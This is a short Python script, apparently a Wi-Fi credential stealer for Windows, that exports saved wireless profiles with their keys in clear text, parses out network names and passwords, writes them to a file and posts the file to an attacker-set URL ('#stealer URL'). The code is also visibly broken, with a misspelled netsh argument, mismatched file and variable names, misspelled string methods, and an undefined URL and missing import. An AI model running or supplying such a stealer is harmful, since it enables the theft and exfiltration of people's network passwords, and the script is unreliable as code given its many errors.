import subprocess
import os
import sys


#stealer URL



#file creat
password_files = open('password.txt',"w")
password_file.write("Here are your Passwords:\n\n")
password_file.close()


#list
wifi_files=[]
wifi_name = []
wifi_password=[]

#Python to execute a windows command
command = subprocess.run(["netsh","wlan", "wxport", "profile","key=clear",],capture_output = True).stdout.decode()

#grab  the current directory
path = os.getcwd()

# hacking scripts

for filename in os.listdir(path):
    if filename.startwith("Wi-Fi") and filename.endwith(".xml"):
        wifi_files.append(filename)
        for i in wifi_files:
             with open(i,'r') as f:
                for line in f.readlines():
                    if 'name' in line:
                        stripped = line.strip()
                        front = stripped[6:]
                        back = front[:-7]
                        wifi_name.append(back)
                        
                    if 'keyMaterial' in line:
                        stripped = line.strip()
                        front = stripped[13:]
                        back = front[:-14]
                        wifi_password.append(back)
                        for x in zip(wifi_name, wifi_password):
                            sys.stdout = open("password.txt", "a")
                            print("SSID: "+x, "password: "+y, sep='\n' )
                            sys.stdout.close()
                            
                            
                            
#send the script
with open('passwords.txt', 'rb') as f:
    r = requests.post(url,data=f)
